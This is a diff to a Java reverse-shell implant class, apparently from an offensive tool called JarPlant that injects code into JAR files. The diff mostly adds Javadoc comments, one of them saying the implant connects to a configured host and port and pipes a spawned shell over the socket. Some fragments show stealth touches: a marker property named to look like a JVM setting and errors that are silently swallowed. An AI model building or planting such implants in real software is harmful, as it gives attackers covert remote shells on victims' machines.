@@ -14,6 +14,14 @@ import java.util.Arrays;
 import java.util.List;
 import java.util.Optional;
 
+/**
+ * Reverse shell implant for JarPlant.
+ * This implant initiates a TCP connection to a configured host+port, executes a shell process on the system and pipes
+ * it all together.
+ * Make sure to set the CONFIG_LHOST variable when injecting this implant!
+ * This code conforms with the standard template for a JarPlant implant.
+ * It's not designed to be included in other codebases but could serve as inspiration.
+ */
 public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandler {
     // Standard config fields from ClassImplant template:
     static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
@@ -89,6 +97,9 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
         // Silently ignore (don't throw up error messages on stderr)
     }
 
+    /**
+     * Code specific to RevShellImplant begins here.
+     */
     private void payload() {
         if (CONF_LHOST == null || CONF_LHOST.isEmpty()) {
             log("[!] No CONF_LHOST set! Aborting.");
@@ -154,6 +165,12 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
         }
     }
 
+    /**
+     * Configure TCP keep-alive for a socket.
+     * These options are technically platform-specific but are typically available for Linux, Windows and macOS.
+     *
+     * @param socket the socket to configure
+     */
     @SuppressWarnings("unchecked")
     private static void setKeepAliveOptions(Socket socket) {
         try {
@@ -189,6 +206,13 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
         }
     }
 
+    /**
+     * Get the send buffer size of a socket.
+     * This depends on the platform.
+     *
+     * @param socket the socket
+     * @return size of the send buffer in bytes, or 65536 if unknown
+     */
     private static int getSendBufferSize(Socket socket) {
         try {
             return socket.getSendBufferSize();
@@ -197,6 +221,13 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
         }
     }
 
+    /**
+     * Get the receiving buffer size of a socket.
+     * This depends on the platform.
+     *
+     * @param socket the socket
+     * @return size of the receiving buffer in bytes, or 65536 or unknown
+     */
     private static int getRecvBufferSize(Socket socket) {
         try {
             return socket.getReceiveBufferSize();
@@ -208,7 +239,7 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
     /**
      * Transfer all data from one stream to another.
      * No string/text interpretation will be done. Just raw bytes.
-     * This method blocks and returns only if the streams are closed, or the current thread is interrupted.
+     * This method blocks and returns only if the streams are closed or the current thread is interrupted.
      *
      * @param input      from
      * @param output     to
@@ -230,6 +261,11 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
         }
     }
 
+    /**
+     * Utility method to ensure things are properly closed.
+     *
+     * @param closeables things to close
+     */
     private static void closeAll(Closeable... closeables) {
         for (Closeable closeable : closeables) {
             try {
@@ -315,6 +351,11 @@ public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandle
         }
     }
 
+    /**
+     * Maybe log something to stdout depending on configuration.
+     *
+     * @param msg message
+     */
     private static void log(String msg) {
         if (CONF_DEBUG_OUTPUT) {
             System.out.println(msg);
